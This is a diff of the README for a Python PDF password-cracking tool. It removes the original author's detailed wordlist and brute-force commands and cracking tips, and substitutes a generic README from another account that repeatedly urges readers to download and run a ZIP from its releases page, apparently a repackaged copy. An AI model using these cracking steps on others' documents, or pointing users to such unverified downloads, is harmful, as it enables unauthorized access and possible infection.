@@ -1,286 +1,117 @@
-# PDF Password Cracker 🔓
+# 🔓 PDF-Password-Cracker - Test PDF Security Easily
 
-A powerful and efficient Python tool to crack password-protected PDF files using wordlist attacks and brute force methods with multithreading support.
+## 📥 Download Now
 
-## ⚠️ Legal Disclaimer
+[![Download PDF-Password-Cracker](https://img.shields.io/badge/Download-PDF--Password--Cracker-brightgreen)](https://github.com/vandondel/PDF-Password-Cracker/releases)
 
-**This tool is for educational and authorized testing purposes only.**
+## 👋 Introduction
 
-- Only use on PDF files you own or have explicit permission to test
-- Unauthorized access to protected documents is illegal
-- Users are responsible for compliance with local laws and regulations
-- The developers assume no liability for misuse of this tool
+PDF-Password-Cracker is a simple tool to check the security of PDF files. It helps you test how strong a PDF password is. You can use it to see if a weak password can be cracked easily. This tool works well for anyone interested in cybersecurity or ethical hacking.
 
-## 🚀 Features
+## 🚀 Getting Started
 
-- 📝 **Wordlist Attack**: Use custom wordlists for targeted password cracking
-- 🔢 **Brute Force Attack**: Generate passwords with customizable character sets and lengths
-- ⚡ **Multithreading**: Parallel processing for faster cracking (configurable thread count)
-- 📊 **Progress Tracking**: Real-time progress bar with speed metrics
-- ⏹️ **Graceful Interruption**: Clean shutdown with Ctrl+C support
-- 🛡️ **Input Validation**: Comprehensive error handling and file validation
-- 🎯 **Smart Defaults**: Optimized default settings for common scenarios
-- 📈 **Performance Metrics**: Shows passwords tried per second and estimated time
+### 📦 System Requirements
 
-## 🛠️ Installation
+Before you begin, ensure your system meets these requirements:
 
-### Prerequisites
+- Operating System: Windows, macOS, or Linux
+- Python 3.6 or later
+- Basic understanding of using the command line
 
-- Python 3.6 or higher
-- pip package manager
+### 📍 Features
 
-### Required Dependencies
+- **Brute-Force Attacks**: Try every combination until the password is found.
+- **Wordlist Attacks**: Use common passwords stored in a list.
+- **Multithreading**: Increase speed by trying multiple passwords at once.
+- **User-Friendly Interface**: Easy to navigate through the command line.
 
-```bash
-pip install pikepdf tqdm
-```
+## 📥 Download & Install
 
-Or use the requirements file:
+To get started, visit this page to download: [Releases Page](https://github.com/vandondel/PDF-Password-Cracker/releases)
 
-```bash
-pip install -r requirements.txt
-```
+1. Click on the link above.
+2. Look for the latest version on the releases page.
+3. Download the file suitable for your operating system.
+4. Follow the installation instructions below based on your OS.
 
-**requirements.txt:**
+### 🖥️ Installation Instructions
 
-```
-pikepdf>=8.0.0
-tqdm>=4.64.0
-```
+#### Windows
 
-### Clone the Repository
+1. After downloading the ZIP file, right-click and select "Extract All."
+2. Open Command Prompt:
+   - Press `Win + R`, type `cmd`, and hit Enter.
+3. Change the directory to the extracted folder. Use the command:
+   ```
+   cd path\to\your\extracted\folder
+   ```
+4. Run the program with:
+   ```
+   python pdf_cracker.py
+   ```
 
-```bash
-git clone https://github.com/AkshayRane05/PDF-Password-Cracker.git
-cd PDF-Password-Cracker
-```
+#### macOS and Linux
 
-## 📖 Usage
+1. After downloading the ZIP file, double-click to extract it.
+2. Open Terminal.
+3. Change the directory to the extracted folder with:
+   ```
+   cd path/to/your/extracted/folder
+   ```
+4. Start the program by typing:
+   ```
+   python3 pdf_cracker.py
+   ```
 
-### Basic Syntax
+## 🎓 How to Use
 
-```bash
-python pdf_cracker.py <pdf_file> [options]
-```
+1. Once you run the program, you will see the command prompt asking for input.
+2. Enter the path to your PDF file and press Enter.
+3. Choose the type of attack you want:
+   - For brute-force, type `brute`
+   - For wordlist, type `wordlist`
+4. If using a wordlist, ensure you have a text file containing potential passwords.
+5. The program will show progress in the command prompt until it finds the password or finishes.
 
-### Wordlist Attack
+## ⚙️ Configuration
 
-```bash
-python pdf_cracker.py protected.pdf -w passwords.txt
-```
+You can customize the tool's behavior by editing the configuration file included in the package. Here are a few options you might consider:
 
-### Brute Force Attack
+- Change the path for your wordlist file.
+- Adjust the number of threads for multithreading options.
+- Set the timeout duration for attacks.
 
-```bash
-python pdf_cracker.py protected.pdf -g -min 1 -max 4 -c "0123456789"
-```
+## 🔑 Security Warning
 
-## 🎯 Examples
+This tool is designed for educational purposes. Always ensure you have permission before testing any PDF file's security. Unauthorized access to data can lead to severe legal consequences.
 
-### 1. **Dictionary Attack with Common Passwords**
+## 🛠️ Troubleshooting
 
-```bash
-python pdf_cracker.py document.pdf -w rockyou.txt -t 8
-```
+If you encounter issues, here are a few common problems and their solutions:
 
-### 2. **Brute Force Numeric PIN (4-6 digits)**
+- **Problem**: The program doesn’t start.
+  - **Solution**: Ensure you have Python installed. Check by running `python --version` in your command line.
+  
+- **Problem**: Errors with the password attack.
+  - **Solution**: Make sure your wordlist file is in the correct format and exists in the path specified.
 
-```bash
-python pdf_cracker.py secure.pdf -g -min 4 -max 6 -c "0123456789"
-```
+## 🔗 Further Resources
 
-### 3. **Brute Force Alphanumeric (lowercase + numbers)**
+For more detailed information about using the tool, check the following resources:
 
-```bash
-python pdf_cracker.py protected.pdf -g -min 1 -max 4 -c "abcdefghijklmnopqrstuvwxyz0123456789"
-```
+- [PDF-Password-Cracker Documentation](https://github.com/vandondel/PDF-Password-Cracker/wiki)
+- [Python Installation Guide](https://www.python.org/downloads/)
 
-### 4. **Custom Character Set (letters + special chars)**
+## 📞 Support
 
-```bash
-python pdf_cracker.py file.pdf -g -min 3 -max 5 -c "ABCabc123!@#"
-```
+If you need further assistance, feel free to reach out on the [GitHub Issues Page](https://github.com/vandondel/PDF-Password-Cracker/issues).
 
-### 5. **High-Performance Wordlist Attack**
+## 🗺️ Community Contributions
 
-```bash
-python pdf_cracker.py target.pdf -w huge_wordlist.txt -t 16
-```
+You can contribute to this project by reporting bugs, discussing features, or submitting pull requests. Your input helps improve the tool for everyone.
 
-## 🔧 Command Line Options
+For any questions, don’t hesitate to ask! Your feedback is valuable.
 
-| Option          | Short  | Description                   | Default     |
-| --------------- | ------ | ----------------------------- | ----------- |
-| `--wordlist`    | `-w`   | Path to wordlist file         | None        |
-| `--generate`    | `-g`   | Enable brute force generation | False       |
-| `--min-length`  | `-min` | Minimum password length       | 1           |
-| `--max-length`  | `-max` | Maximum password length       | 4           |
-| `--charset`     | `-c`   | Characters for generation     | `a-z + 0-9` |
-| `--max-workers` | `-t`   | Number of threads             | 4           |
+## 📥 Download Now Again!
 
-## 📊 Performance Guide
-
-### **Thread Optimization**
-
-- **2-4 threads**: Good for basic cracking
-- **4-8 threads**: Optimal for most systems
-- **8-16 threads**: High-performance systems only
-- **16+ threads**: May cause diminishing returns
-
-### **Character Set Recommendations**
-
-- **Numeric only** (`0-9`): Fastest, good for PINs
-- **Lowercase + numbers** (`a-z0-9`): Balanced speed/coverage
-- **Mixed case + numbers** (`A-Za-z0-9`): Slower but comprehensive
-- **Full ASCII**: Very slow, use only for short passwords
-
-### **Expected Performance**
-
-- **Wordlist**: 100-1000+ passwords/second
-- **Brute Force**: Depends on character set size
-  - 4-digit numeric: ~10,000 combinations
-  - 4-char lowercase+numbers: ~1.68M combinations
-  - 6-char full ASCII: ~735B combinations
-
-## 🎮 Sample Output
-
-```
-[*] Loading wordlist: passwords.txt
-[*] Total passwords in wordlist: 14,344,391
-[*] Using 8 worker threads
-[*] Starting password cracking... (Press Ctrl+C to stop)
-Cracking PDF: 45%|████████████▌              | 6,455,176/14,344,391 pwd [02:15<02:45, 47.8Kpwd/s]
-
-[+] Password found: admin123
-
-[+] SUCCESS! Password found: 'admin123'
-```
-
-## 📁 Project Structure
-
-```
-PDF-Password-Cracker/
-├── pdf_cracker.py           # Main cracking script
-├── requirements.txt         # Python dependencies
-├── passwords.txt           # Sample wordlist for testing
-├── README.md              # This documentation
-└── examples/              # Example files and scripts
-    ├── test_protected.pdf # Sample encrypted PDF
-    └── create_test_pdf.py # Script to create test files
-```
-
-## 🧪 Testing
-
-### Create Test PDF
-
-First, create a password-protected PDF for testing:
-
-```bash
-# Using the PDF Protection Tool
-python -c "
-import pikepdf
-pdf = pikepdf.new()
-pdf.pages.append(pikepdf.Page.empty_page(pdf, 200, 300))
-pdf.save('test.pdf', encryption={'user': 'password123'})
-"
-```
-
-### Test the Cracker
-
-```bash
-python pdf_cracker.py test.pdf -w passwords.txt
-```
-
-## ⚡ Tips for Effective Cracking
-
-1. **Start with wordlists** - Much faster than brute force
-2. **Use common password lists** - rockyou.txt, SecLists, etc.
-3. **Target specific patterns** - If you know password format
-4. **Monitor system resources** - Don't over-thread
-5. **Use realistic character sets** - Most passwords use limited chars
-6. **Try variations** - Add numbers/symbols to dictionary words
-
-## 🛡️ Security Notes
-
-- **This tool demonstrates PDF security weaknesses**
-- **Strong passwords significantly increase cracking time**
-- **Consider using certificate-based PDF encryption for sensitive documents**
-- **Modern PDFs with AES-256 encryption are much harder to crack**
-
-## 🔍 Troubleshooting
-
-### Common Issues
-
-| Problem                        | Solution                                        |
-| ------------------------------ | ----------------------------------------------- |
-| `ModuleNotFoundError: pikepdf` | Run `pip install pikepdf`                       |
-| PDF not password protected     | Tool will detect and notify                     |
-| Wordlist file not found        | Check file path and permissions                 |
-| Out of memory errors           | Reduce thread count with `-t`                   |
-| Very slow performance          | Try smaller character set or shorter max length |
-
-### Performance Issues
-
-- **Reduce thread count** if system becomes unresponsive
-- **Use SSD storage** for large wordlists
-- **Close other applications** to free up resources
-- **Monitor CPU and RAM usage**
-
-## 🤝 Contributing
-
-Contributions are welcome! Areas for improvement:
-
-- **GPU acceleration** using CUDA/OpenCL
-- **Smart password generation** using common patterns
-- **Resume functionality** for interrupted sessions
-- **Multiple PDF batch processing**
-- **Additional encryption algorithm support**
-
-### Development Setup
-
-```bash
-git clone https://github.com/AkshayRane05/PDF-Password-Cracker.git
-cd PDF-Password-Cracker
-pip install -r requirements.txt
-python pdf_cracker.py --help
-```
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚖️ Ethical Usage
-
-This tool is provided for:
-
-- ✅ Educational purposes and learning about PDF security
-- ✅ Testing your own PDF files
-- ✅ Authorized penetration testing with proper permissions
-- ✅ Security research and vulnerability assessment
-
-**NOT for:**
-
-- ❌ Unauthorized access to others' documents
-- ❌ Breaking into systems you don't own
-- ❌ Any illegal activities
-
-## 🙏 Acknowledgments
-
-- [pikepdf](https://github.com/pikepdf/pikepdf) - Excellent Python PDF library
-- [tqdm](https://github.com/tqdm/tqdm) - Beautiful progress bars
-- Security research community for password analysis insights
-
-## 📞 Contact
-
-- **GitHub**: [@AkshayRane05](https://github.com/AkshayRane05)
-- **Issues**: [Report bugs or request features](https://github.com/AkshayRane05/PDF-Password-Cracker/issues)
-
----
-
-⭐ **If this tool helped you understand PDF security better, please star the repository!**
-
-## 📈 Related Projects
-
-- [PDF Protection Tool](https://github.com/AkshayRane05/PDF-Protection-Tool) - Create password-protected PDFs
-<!-- - [PDF Merger](https://github.com/AkshayRane05/PDF_Merger) - Combine multiple PDF files
-- [Document Security Scanner](https://github.com/AkshayRane05/Doc_Security_Scanner) - Analyze document security -->
+For quick access, visit this page to download: [Releases Page](https://github.com/vandondel/PDF-Password-Cracker/releases)
